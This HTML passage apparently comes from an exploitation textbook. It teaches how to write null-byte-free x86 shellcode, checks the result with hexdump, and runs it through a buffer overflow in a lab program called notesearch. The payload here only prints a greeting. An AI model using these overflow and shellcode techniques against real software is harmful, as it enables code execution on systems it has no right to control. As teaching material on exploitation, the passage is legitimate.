0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_881.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">You can safely use the <span class="s31">sub </span>instruction to zero registers (if done at the beginning of the shellcode), but the <span class="s31">xor </span>instruction is most commonly used in shellcode in the wild. This next revision of the shellcode makes use of the smaller registers and the <span class="s31">xor </span>instruction to avoid null bytes. The <span class="s31">inc </span>and <span class="s31">dec </span>instructions have also been used when possible to make for even smaller shellcode.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">helloworld3.s</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_882.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 212%;text-align: left;">BITS 32      ; Tell nasm this is 32-bit code. jmp short one    ; Jump down to a call at the end.</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">two:</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">; ssize_t write(int fd, const void *buf, size_t count);</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">pop ecx     ; Pop the return address (string ptr) into ecx. xor eax, eax   ; Zero out full 32 bits of eax register.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">mov al, 4    ; Write syscall #4 to the low byte of eax. xor ebx, ebx   ; Zero out ebx.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">inc ebx     ; Increment ebx to 1, STDOUT file descriptor. xor edx, edx</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">mov dl, 15    ; Length of the string</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">int 0x80     ; Do syscall: write(1, string, 14)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">; void _exit(int status);</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 107%;text-align: left;">mov al, 1    ; Exit syscall #1, the top 3 bytes are still zeroed. dec ebx     ; Decrement ebx back down to 0 for status = 0.</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;line-height: 10pt;text-align: left;">int 0x80     ; Do syscall: exit(0)</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">one:</p><p class="s31" style="padding-left: 99pt;text-indent: 0pt;text-align: left;">call two  ; Call back upwards to avoid null bytes</p><p class="s31" style="padding-bottom: 3pt;padding-left: 99pt;text-indent: 0pt;text-align: left;">db &quot;Hello, world!&quot;, 0x0a, 0x0d ; with newline and carriage return bytes.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_883.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">After assembling this shellcode, hexdump and grep are used to quickly check it for null bytes.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_884.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ nasm helloworld3.s</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ hexdump -C helloworld3 | grep --color=auto 00 00000000 eb 13 59 31 c0 b0 04 31 db 43 31 d2 b2 0f cd 80 |..Y1...1.C1.  |</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 10pt;text-align: left;">00000010  b0 01 4b cd 80 e8 e8 ff  ff ff 48 65 6c 6c 6f 2c  |..K    Hello,|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000020 20 77 6f 72 6c 64 21 0a 0d            | world!..|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000029</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_885.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Now this shellcode is usable, as it doesn’t contain any null bytes. When used with an exploit, the notesearch program is coerced into greeting the world like a newbie.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_886.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: justify;">reader@hacking:~/booksrc $ export SHELLCODE=$(cat helloworld3) reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch SHELLCODE will be at 0xbffff9bc</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./notesearch $(perl -e &#39;print &quot;\xbc\xf9\xff\xbf&quot;x40&#39;) [DEBUG] found a 33 byte note for user id 999</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">-------[ end of note data ]------- Hello, world!</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking :~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_887.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="toc">&nbsp;</p><div class="toc"><a class="toc0" href="part121.htm">0x530 Shell-Spawning Shellcode</a></div><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part119.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part121.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
